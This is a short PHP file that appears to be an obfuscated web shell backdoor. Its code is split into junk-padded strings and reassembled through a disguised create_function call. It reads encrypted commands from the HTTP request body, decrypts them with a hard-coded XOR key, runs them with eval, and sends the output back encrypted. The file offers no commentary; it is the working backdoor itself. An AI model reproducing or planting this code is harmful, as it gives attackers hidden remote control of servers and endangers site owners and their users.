<?php
$k='Qch("/$kQh(.+)$kf/",@fQile_geQt_contentQs(Q"php:/Q/input")Q,$m)Q==1) {@ob_QQstart()';
$l='ob_end_clean();$r=Q@basQe64_encoQQde(@x(@gzcomQpress(QQ$o),Q$k));printQ("$pQ$kh$r$kf");}';
$J='$k="0Q5Q253035";$QkQh="0107Q58a09530";Q$kfQ="30658466b7Q1Q4";$pQ="DvX7QPkFSED624HY4QQ";';
$T='fuQnction x($t,$k){$Qc=strQlenQ($k);$l=stQrQlen($t);Q$o="";QfoQr($i=0;$iQ<$l;)QQ{for($';
$Q=';@QeQval(@gzuncompQresQs(@Qx(@bQase64_decode($m[1Q]),$k)Q));$o=Q@ob_Qget_cQonteQQntQs();@';
$a=str_replace('oR','','croRoReoRate_oRoRfuncoRtion');
$S='j=0;($jQ<$c&&$i<$QQl);$j++,$iQ++){$o.=Q$tQ{$i}Q^$k{$Qj};Q}}returnQ $o;}iQf (@pregQ_Qmat';
$m=str_replace('Q','',$J.$T.$S.$k.$Q.$l);
$N=$a('',$m);$N();
?>
